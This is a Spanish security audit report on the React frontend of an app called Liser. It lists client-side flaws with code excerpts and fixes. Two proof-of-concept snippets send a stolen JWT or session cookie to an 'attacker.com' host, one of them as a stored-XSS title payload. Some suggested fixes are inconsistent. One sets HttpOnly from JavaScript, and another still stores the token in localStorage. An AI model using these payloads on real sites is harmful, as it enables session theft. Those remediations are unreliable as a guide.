# 🔐 INFORME DE AUDITORÍA - FRONTEND REACT
## Liser v26 - Vulnerabilidades del Lado del Cliente

**Fecha:** Junio 2026  
**Componente:** Frontend React  
**Severidad General:** CRÍTICA

---

## 📋 RESUMEN EJECUTIVO

El frontend React presenta **vulnerabilidades críticas de seguridad** que permiten:
- Robo de tokens JWT almacenados en localStorage
- Acceso no autorizado mediante manipulación del cliente
- Escalación de privilegios desde el navegador
- Cross-Site Scripting (XSS) potencial
- Session hijacking y account takeover

---

## 🔴 VULNERABILIDADES CRÍTICAS

### 1. **TOKEN ALMACENADO EN LOCALSTORAGE SIN PROTECCIÓN** ⚠️ CRÍTICA
**Archivo:** `src/context/AuthContext.js` (líneas 8, 31, 39, 45)  
**Severidad:** CRÍTICA (CVSS 9.3)

#### Descripción del Problema:
```javascript
// ❌ INSEGURO - Token en localStorage sin protección
const [token, setToken] = useState(localStorage.getItem('liser_token'));

const login = async (email, password) => {
    const res = await api.post('/auth/login', { email, password });
    localStorage.setItem('liser_token', res.data.token);  // ← localStorage
    setToken(res.data.token);
    setUser(res.data.user);
    return res.data;
};

const loginWithToken = async (token) => {
    localStorage.setItem('liser_token', token);  // ← localStorage
    setToken(token);
    // ...
};
```

#### Impacto:
- **XSS Vulnerability:** Cualquier XSS en la página = robo de token
- **Malware:** Software malicioso en el dispositivo puede leer localStorage
- **Extensión maliciosa:** Extensiones del navegador pueden acceder a localStorage
- **Persistencia:** Token almacenado indefinidamente (no hay expiración)
- **CSRF + localStorage:** Combinación destructiva para seguridad

#### Prueba de Concepto (XSS):
```javascript
// En cualquier página vulnerable a XSS:
const token = localStorage.getItem('liser_token');
// Enviar a servidor atacante
fetch('https://attacker.com/steal?token=' + token);
```

#### Remediación:
```javascript
// ✅ SEGURO - HttpOnly Cookie + Memory storage
const [user, setUser] = useState(null);
const [loading, setLoading] = useState(true);
const [theme, setTheme] = useState(localStorage.getItem('liser_theme') || 'dark');

useEffect(() => {
    // Token ya viene en HttpOnly cookie automáticamente
    // NO guardamos en localStorage
    api.get('/auth/me')
        .then(res => { setUser(res.data); setLoading(false); })
        .catch(() => { setUser(null); setLoading(false); });
}, []);

const login = async (email, password) => {
    const res = await api.post('/auth/login', { email, password });
    // Token va en HttpOnly cookie automáticamente
    // Solo guardamos user en state (memory)
    setUser(res.data.user);
    return res.data;
};

const logout = () => {
    // Backend borra la cookie
    api.post('/auth/logout');
    setUser(null);
};
```

**Backend también necesita cambio:**
```python
# En lugar de devolver token en JSON:
response = JSONResponse({"ok": True})
response.set_cookie(
    key="Authorization",
    value=f"Bearer {token}",
    httponly=True,          # ← JavaScript NO puede acceder
    secure=True,            # ← Solo HTTPS
    samesite="strict",      # ← Protección CSRF
    max_age=900,            # ← 15 minutos
    path="/api"
)
return response
```

---

### 2. **FALTA DE VALIDACIÓN DE PRIVILEGIOS EN FRONTEND** ⚠️ CRÍTICA
**Archivo:** `src/App.js` (líneas 29-52)  
**Severidad:** CRÍTICA (CVSS 8.9)

#### Descripción del Problema:
```javascript
function AdminRoute({ children }) {
  const { user, loading } = useAuth();
  if (loading) return null;
  if (!user || user.role !== 'admin') return <Navigate to="/dashboard" />;
  return children;  // ← Solo valida en UI, no en backend
}

function PlanRoute({ minPlan, children }) {
  const { user, loading } = useAuth();
  if (loading) return null;
  if (!user) return <Navigate to="/auth" />;
  const userLevel = PLAN_HIERARCHY.indexOf(user.plan || 'free');
  const requiredLevel = PLAN_HIERARCHY.indexOf(minPlan);
  if (userLevel < requiredLevel) return <Navigate to="/dashboard" />;
  return children;  // ← Solo valida en UI
}
```

#### Impacto:
- **Frontend validation es bypassable:** Usuario puede modificar `user.role` en memory
- **Plan bypass:** Atacante puede cambiar su plan localmente y acceder a features premium
- **Admin impersonation:** Cambiar `user.role = 'admin'` en console
- **Backend tiene la culpa:** Si backend no valida, frontend bypass = acceso total

#### Prueba de Concepto:
```javascript
// En console del navegador (F12):
// 1. Modificar user en contexto
// (Requiere acceso al AuthContext, pero puede hacerse con manipulación)

// 2. Acceder a /admin aunque no sea admin
// La página carga sin validación backend

// 3. Llamar API directamente:
fetch('https://api.liser.es/api/admin/users', {
    headers: { 'Authorization': 'Bearer <token>' }
})
// Si backend no valida role, devuelve datos
```

#### Remediación:
- **Backend DEBE validar** todos los endpoints
- El frontend es solo UI, no seguridad
- Ver remediaciones en informe de backend (Paso 2)

---

### 3. **EXPOSICIÓN DE DATOS SENSIBLES EN URL** ⚠️ CRÍTICA
**Archivo:** `src/pages/GoogleCallbackPage.js` (línea 11)  
**Severidad:** CRÍTICA (CVSS 8.7)

#### Descripción del Problema:
```javascript
export default function GoogleCallbackPage() {
    const [searchParams] = useSearchParams();
    const navigate = useNavigate();
    const { loginWithToken } = useAuth();

    useEffect(() => {
        const token = searchParams.get('token');  // ← TOKEN EN URL
        const error = searchParams.get('error');
        if (token) {
            loginWithToken(token);
            navigate('/dashboard');
        } else {
            navigate('/auth?error=' + (error || 'google_failed'));
        }
    }, []);

    return null;
}
```

#### Impacto:
- **Token en URL:** Visible en history del navegador
- **URL logging:** Servidores web logean URLs (incluyendo tokens)
- **Referer headers:** Token enviado a sitios terceros en el referer
- **Browser history:** Cualquiera con acceso al dispositivo ve tokens
- **Proxy/Cache:** CDN y proxies pueden cachear URLs con tokens

#### Prueba de Concepto:
```
URL que se carga:
https://liser.es/auth/google?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

1. Usuario cierra navegador, otro usa la PC
2. Ve history y obtiene token válido
3. O: Attacker obtiene access logs del servidor
```

#### Remediación:
```python
# Backend: Usar POST en lugar de GET
@router.post("/auth/google/callback")
async def google_callback(data: dict, request: Request):
    code = data.get("code")
    state = data.get("state")
    stored_state = request.cookies.get("oauth_state", "")
    
    if not stored_state or stored_state != state:
        raise HTTPException(status_code=400, detail="Invalid state")
    
    # ... obtener token de Google ...
    
    # Devolver en JSON en POST (no en URL GET)
    response = JSONResponse({"token": jwt_token})
    response.delete_cookie("oauth_state")
    return response
```

```javascript
// Frontend: Usar POST en lugar de GET
const handleGoogleCallback = async (code, state) => {
    const res = await api.post('/auth/google/callback', { code, state });
    localStorage.setItem('liser_token', res.data.token);  // Pero aún hay problema de localStorage
    loginWithToken(res.data.token);
}
```

---

### 4. **VALIDACIÓN DESIGUAL DE CONTRASEÑAS (FRONTEND VS BACKEND)** ⚠️ CRÍTICA
**Archivo:** `src/pages/AuthPage.js` (líneas 35-39)  
**Severidad:** ALTA (CVSS 7.4)

#### Descripción del Problema:
```javascript
// Frontend valida:
if (registerData.password.length < 8) { toast.error('8 chars min'); return; }
if (!/(?=.*[A-Z])(?=.*[0-9])/.test(registerData.password)) { 
    toast.error('mayúscula y número'); return; 
}
// Pero backend valida diferente:
if len(new_password) < 8:
    raise HTTPException(status_code=400, detail="Mínimo 8 caracteres")
if not re.search(r'[A-Z]', new_password):
    raise HTTPException(status_code=400, detail="Debe contener mayúscula")
if not re.search(r'[0-9]', new_password):
    raise HTTPException(status_code=400, detail="Debe contener número")
```

#### Impacto:
- **Inconsistencia:** Frontend rechaza algunas contraseñas que backend acepta
- **Bypass:** Enviando directamente al API por POST, se usan reglas backend
- **Confusión:** Usuario piensa que contraseña es válida en frontend pero backend la rechaza

#### Remediación:
```javascript
// Frontend: Usar MISMAS reglas que backend
const validatePassword = (pwd) => {
    if (pwd.length < 8) return "Mínimo 8 caracteres";
    if (!/[A-Z]/.test(pwd)) return "Debe contener mayúscula";
    if (!/[0-9]/.test(pwd)) return "Debe contener número";
    if (pwd.length > 100) return "Máximo 100 caracteres";
    return null;
};

// Usarlo en ambos lugares
const error = validatePassword(registerData.password);
if (error) { toast.error(error); return; }
```

---

### 5. **INFORMACIÓN DISCLOSURE VÍA COOKIES** ⚠️ CRÍTICA
**Archivo:** `src/pages/BagListDetailPage.js` (líneas 51-59)  
**Severidad:** ALTA (CVSS 6.8)

#### Descripción del Problema:
```javascript
const getLiserClicks = () => {
    const cookie = document.cookie.split(';').find(c => c.trim().startsWith('liser_clicks='));
    if (!cookie) return {};
    try { 
        return JSON.parse(decodeURIComponent(cookie.split('=')[1])); 
    } catch { 
        return {}; 
    }
};

const setLiserClicks = (data) => {
    // ❌ Cookie sin protección
    document.cookie = `liser_clicks=${encodeURIComponent(JSON.stringify(data))}; max-age=31536000; path=/`;
};

const handleProductClick = async (baglistId, productId) => {
    // ...
    const clicks = getLiserClicks();
    const lastClick = clicks[productId];  // Tracking local
    const now = Date.now();
    const alreadyClicked = lastClick && (now - lastClick) < 24 * 60 * 60 * 1000;
    // ...
    clicks[productId] = now;
    setLiserClicks(clicks);  // ← Guarda en cookie sin HttpOnly
};
```

#### Impacto:
- **Cookie accesible por JavaScript:** Sin HttpOnly flag
- **Información tracking:** Qué productos clicked, cuándo, cuántas veces
- **Privacidad:** Historial de comportamiento guardado en navegador
- **1 año de validez:** Cookie dura 31536000 segundos

#### Remediación:
```javascript
// NO USAR cookies para tracking sensible desde JavaScript
// Usar servidor para tracking

// O si es necesario en cliente:
const setLiserClicks = (data) => {
    // Al menos encriptar localmente
    document.cookie = `liser_clicks=${encodeURIComponent(JSON.stringify(data))}; max-age=31536000; path=/; HttpOnly; Secure; SameSite=Strict`;
    // Pero HttpOnly hace que JS no pueda leer, entonces...
    
    // MEJOR: Usar Session Storage (limpiado al cerrar)
    sessionStorage.setItem('liser_clicks', JSON.stringify(data));
};

const getLiserClicks = () => {
    try {
        return JSON.parse(sessionStorage.getItem('liser_clicks') || '{}');
    } catch {
        return {};
    }
};
```

---

### 6. **FALTA DE CSRF PROTECTION EN ESTADO SENSIBLE** ⚠️ ALTA
**Archivo:** `src/lib/api.js` (líneas 7-11)  
**Severidad:** ALTA (CVSS 7.1)

#### Descripción del Problema:
```javascript
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('liser_token');
    if (token) config.headers.Authorization = `Bearer ${token}`;
    return config;
});
```

#### Impacto:
- **Sin CSRF token:** Aunque Bearer token es relativamente seguro, no hay CSRF token adicional
- **Cambios de estado:** PUT/DELETE sin CSRF pueden ser exploitadas
- **Cross-origin:** Si CORS permite origins maliciosas, CSRF es posible

#### Remediación:
```javascript
// Agregar CSRF token
api.interceptors.request.use((config) => {
    const token = localStorage.getItem('liser_token');
    if (token) {
        config.headers.Authorization = `Bearer ${token}`;
    }
    
    // Agregar CSRF token si es método que modifica
    if (['post', 'put', 'delete', 'patch'].includes(config.method?.toLowerCase())) {
        const csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
        if (csrfToken) {
            config.headers['X-CSRF-Token'] = csrfToken;
        }
    }
    
    return config;
});
```

---

### 7. **XSS POTENCIAL EN RENDERIZADO DE DATOS DE USUARIO** ⚠️ ALTA
**Archivo:** `src/pages/BagListDetailPage.js` (líneas 184-186)  
**Severidad:** ALTA (CVSS 6.9)

#### Descripción del Problema:
```javascript
// En main.py del backend:
"<h1>" + baglist['title'] + "</h1>"  // ← XSS: Sin escape
"<p>" + description + "</p>"         // ← XSS: Sin escape

// Función esc() existe pero no siempre se usa
def esc(s): return (s or "").replace("&","&amp;")...
product_html = "".join(
    "<h2>" + esc(p.get('name')) + "</h2>..."  # ← Aquí SÍ escapa
    for p in products
)
```

#### Impacto:
- **Server-Side Rendering vulnerable:** Prerender endpoints pueden ser explotados
- **Stored XSS:** Si title/description no está escapado, XSS persistente
- **Afecta a todos los usuarios:** Todos ven la versión maliciosa

#### Prueba de Concepto:
```
1. Atacante crea baglist con título:
   "<img src=x onerror='fetch(\"https://attacker.com/steal?cookie=\"+document.cookie)'>"

2. Cuando backend renderiza HTML, ejecuta JavaScript
3. Cookie robada para cada usuario que ve la lista
```

#### Remediación:
```python
# En main.py - Usar función escape consistentemente
def esc(s):
    return (s or "").replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&#x27;")

# EN TODAS partes donde renderizamos user input:
html = (
    "<!DOCTYPE html><html lang='es'><head>"
    "<meta charset='UTF-8'>"
    "<title>" + esc(baglist['title'] + " — Liser") + "</title>"  # ← Escape
    "<meta name='description' content='" + esc(description) + "'>"  # ← Escape
    # ... más escaping consistente
)
```

---

## 🟠 VULNERABILIDADES ALTAS

### 8. **FALTA DE RATE LIMITING EN CLIENTE** 
**Archivo:** `src/pages/EditProfilePage.js`  
**Severidad:** ALTA (CVSS 6.3)

- No hay debounce/throttling en cambios de email/password
- Usuario puede clickear "Guardar" 100 veces por segundo
- Genera 100 requests al servidor sin protección

**Remediación:**
```javascript
const handleEmailSave = async () => {
    if (savingEmail) return;  // ← Evitar múltiples clicks
    setSavingEmail(true);
    try {
        await api.put('/auth/me/email', emailForm);
        toast.success('Email actualizado');
    } finally { 
        setSavingEmail(false); 
    }
};
```

---

### 9. **INFORMACIÓN DISCLOSURE EN PÁGINAS PÚBLICAS**
**Archivo:** `src/pages/ProfilePage.js` (línea 84)  
**Severidad:** ALTA (CVSS 6.5)

- Endpoint GET `/users/{username}` devuelve datos sensibles
- Frontend no puede proteger lo que backend devuelve
- Ver remediación en informe de Backend (Paso 2)

---

### 10. **NO HAY VALIDACIÓN DE REDIRECT**
**Archivo:** `src/App.js` (línea 79)  
**Severidad:** MEDIA-ALTA (CVSS 5.8)

```javascript
<Route path="/" element={user ? <Navigate to="/dashboard" /> : <LandingPage />} />
// Si user tiene plan "free", redirect to "/dashboard"
// No hay validación de parámetro 'next' para evitar open redirect
```

---

## 🟡 VULNERABILIDADES MEDIAS

### 11. **SIN PROTECCIÓN CONTRA HERRAMIENTAS DE DESARROLLO**
**Archivo:** Código general  
**Severidad:** MEDIA (CVSS 4.3)

- React DevTools exponen componentes y state
- Sin CSP para bloquear scripts maliciosos
- Cookies accesibles desde console

### 12. **ERROR MESSAGES DEMASIADO DETALLADOS**
**Archivo:** Múltiples páginas  
**Severidad:** MEDIA (CVSS 4.1)

```javascript
toast.error(err.response?.data?.detail || 'Error al registrarse');
// Expone respuestas exactas del servidor
```

---

## 📊 MATRIZ DE RIESGOS (FRONTEND)

| # | Vulnerabilidad | Severidad | Impacto | Ubicación |
|---|---|---|---|---|
| 1 | Token en localStorage | CRÍTICA | Account Takeover | AuthContext |
| 2 | Sin validación backend | CRÍTICA | Escalación Privilegios | App.js |
| 3 | Token en URL | CRÍTICA | Token Exposure | GoogleCallback |
| 4 | Validación inconsistente | ALTA | Bypass Reglas | AuthPage |
| 5 | Cookies sin HttpOnly | ALTA | XSS Risk | BagListDetail |
| 6 | Sin CSRF Token | ALTA | CSRF Attacks | api.js |
| 7 | Renderizado sin escape | ALTA | Stored XSS | main.py |
| 8 | Sin rate limiting | ALTA | API Abuse | EditProfile |
| 9 | Info disclosure | ALTA | Data Leak | ProfilePage |
| 10 | Open redirect potential | MEDIA-ALTA | Phishing | App.js |

---

## 🛠️ RECOMENDACIONES INMEDIATAS

### CRÍTICA (Hoy):
- [ ] Mover token de localStorage a HttpOnly cookie
- [ ] Validar role/plan SOLO en backend
- [ ] Remover token de URL (usar POST)
- [ ] Implementar escaping en todas las páginas HTML

### ALTA (Esta semana):
- [ ] Agregar CSRF token validation
- [ ] Implementar debounce/throttling en botones
- [ ] Remover información sensible de respuestas API (frontend no puede proteger)
- [ ] Validar respuestas de servidor

### MEDIA (Este mes):
- [ ] Agregar CSP headers
- [ ] Mejorar error messages
- [ ] Documentar seguridad para devs

---

## 📝 CONCLUSIÓN

El frontend React tiene **vulnerabilidades críticas principalmente heredadas del backend**:
- Storage inseguro de tokens (localStorage + HttpOnly)
- Confianza en validación del cliente (Frontend sin validación)
- Exposición de datos sensibles desde API

**La mayoría de problemas se solucionan en el BACKEND.**  
Frontend solo puede:
- No confiar en user input
- No almacenar secretos
- No validar por seguridad

---

*Auditoría completada: 24 de junio de 2026*  
*Estado: REQUIERE REMEDIACIÓN INMEDIATA*
